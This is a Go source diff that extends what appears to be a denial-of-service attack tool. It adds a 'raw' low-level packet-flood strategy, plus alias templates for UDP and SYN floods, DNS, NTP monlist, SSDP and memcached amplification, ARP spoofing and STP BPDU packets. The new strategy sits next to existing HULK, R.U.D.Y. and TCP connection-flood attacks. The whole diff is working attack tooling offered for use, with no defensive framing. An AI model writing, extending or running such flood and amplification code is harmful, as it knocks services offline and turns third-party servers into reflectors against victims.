@@ -14,6 +14,23 @@ type StrategyFactory struct {
 	BindIP string
 }
 
+// TemplateAliases maps short names to template paths
+var TemplateAliases = map[string]string{
+	"udp":       "templates/raw/udp_flood.txt",
+	"syn":       "templates/raw/tcp_syn.txt",
+	"dns":       "templates/raw/dns_query.txt",
+	"dns-amp":   "templates/raw/dns_any_query.txt",
+	"icmp":      "templates/raw/icmp_echo.txt",
+	"icmpv6":    "templates/raw/icmpv6_echo.txt",
+	"ntp":       "templates/raw/ntp_monlist.txt",
+	"ssdp":      "templates/raw/ssdp_search.txt",
+	"memcached": "templates/raw/memcached.txt",
+	"arp":       "templates/raw/arp_request.txt",
+	"arp-spoof": "templates/raw/arp_reply.txt",
+	"igmp":      "templates/raw/igmp_query.txt",
+	"stp":       "templates/raw/stp_bpdu.txt",
+}
+
 // NewStrategyFactory creates a new StrategyFactory instance.
 func NewStrategyFactory(cfg *config.StrategyConfig, bindIP string) *StrategyFactory {
 	return &StrategyFactory{
@@ -83,6 +100,14 @@ func (f *StrategyFactory) CreateByType(strategyType string) AttackStrategy {
 	case "tcp-flood":
 		return NewTCPFloodWithConfig(f.Config, f.BindIP)
 
+	case "raw":
+		// Resolve alias if needed
+		templatePath := f.Config.PacketTemplate
+		if resolved, ok := TemplateAliases[templatePath]; ok {
+			templatePath = resolved
+		}
+		return NewRawStrategy(f.Config, f.BindIP, templatePath)
+
 	default:
 		log.Printf("Unknown strategy '%s', using 'keepalive'", strategyType)
 		return NewKeepAliveHTTPWithConfig(f.Config, f.BindIP)
@@ -112,6 +137,7 @@ func AvailableStrategies() []StrategyInfo {
 		{Name: "hulk", Description: "Enhanced HULK - Dynamic evasion & flood"},
 		{Name: "rudy", Description: "R.U.D.Y. attack - advanced slow POST with evasion"},
 		{Name: "tcp-flood", Description: "TCP Connection Flood - exhaust server connection limits"},
+		{Name: "raw", Description: "Low-Level Packet Flood using templates (UDP/TCP/ICMP)"},
 	}
 }
 
@@ -137,6 +163,7 @@ func ValidateStrategyType(strategyType string) error {
 		"hulk":                true,
 		"rudy":                true,
 		"tcp-flood":           true,
+		"raw":                 true,
 	}
 
 	if !validTypes[strategyType] {
@@ -217,6 +244,7 @@ func IsFloodAttack(strategyType string) bool {
 		"heavy-payload": true,
 		"hulk":          true,
 		"tcp-flood":     true,
+		"raw":           true,
 	}
 	return floodAttacks[strategyType]
 }
